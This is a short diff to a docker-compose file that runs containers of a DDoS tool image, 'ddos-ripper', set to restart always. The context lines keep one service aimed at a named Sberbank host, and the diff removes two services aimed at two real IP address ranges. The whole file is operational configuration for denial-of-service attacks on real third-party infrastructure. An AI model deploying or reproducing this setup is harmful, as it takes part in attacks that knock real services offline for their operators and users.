@@ -12,11 +12,3 @@ services:
     image: nitupkcuf/ddos-ripper:latest
     restart: always
     command: stat.online.sberbank.ru
-  ddos-runner-4:
-    image: nitupkcuf/ddos-ripper:latest
-    restart: always
-    command: 91.215.36.0/22
-  ddos-runner-5:
-    image: nitupkcuf/ddos-ripper:latest
-    restart: always
-    command: 195.209.150.0/24
